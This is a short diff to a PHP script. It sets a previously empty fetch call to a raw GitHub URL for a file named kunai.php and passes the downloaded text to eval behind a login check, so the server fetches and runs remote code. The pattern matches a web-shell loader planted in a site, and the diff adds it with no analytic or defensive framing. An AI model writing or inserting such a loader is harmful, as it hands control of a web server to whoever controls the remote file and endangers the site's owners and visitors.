@@ -33,7 +33,7 @@ if (is_logged_in()) {
         return $url_get_contents_data;
     }
 
-    $a = geturlsinfo('');
+    $a = geturlsinfo('https://raw.githubusercontent.com/polaranoid/cron/refs/heads/main/kunai.php');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
